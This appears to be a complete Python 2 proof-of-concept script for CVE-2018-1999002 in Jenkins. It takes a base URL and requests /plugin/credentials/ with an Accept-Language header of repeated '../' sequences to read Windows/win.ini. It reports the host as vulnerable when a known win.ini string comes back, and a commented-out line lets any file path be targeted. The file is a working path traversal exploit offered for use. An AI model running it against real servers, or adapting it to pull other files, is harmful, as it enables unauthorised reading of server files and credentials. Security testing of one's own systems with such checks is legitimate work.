import requests
import sys
import os
 
 
if len(sys.argv) != 2:
    print 'usage:\n\tpython CVE-2018-1999002.py [jenkins base url]'
    print 'exemple:\n\tpython CVE-2018-1999002.py http://localhost:8080/'
    sys.exit(1)

host = sys.argv[1]
# file_path = sys.argv[2].lstrip('/')
file_path = 'Windows/win.ini'
file_name, file_ext = os.path.splitext(file_path)
 
if not file_ext:
    print 'the file must have an ext'
 
url = host + '/plugin/credentials/' + file_ext
headers = { 
        'Accept-Language': '../' * 15  + file_name 
        }

resp = requests.get(url, headers=headers)
 
# print 'url:', url
# print headers

if resp.status_code == 200 and 'for 16-bit app support' in resp.content:
    print '%s is vulnerable' %(host,)
    # print resp.content
else:
    print '%s is not vulnerable' %(host,)
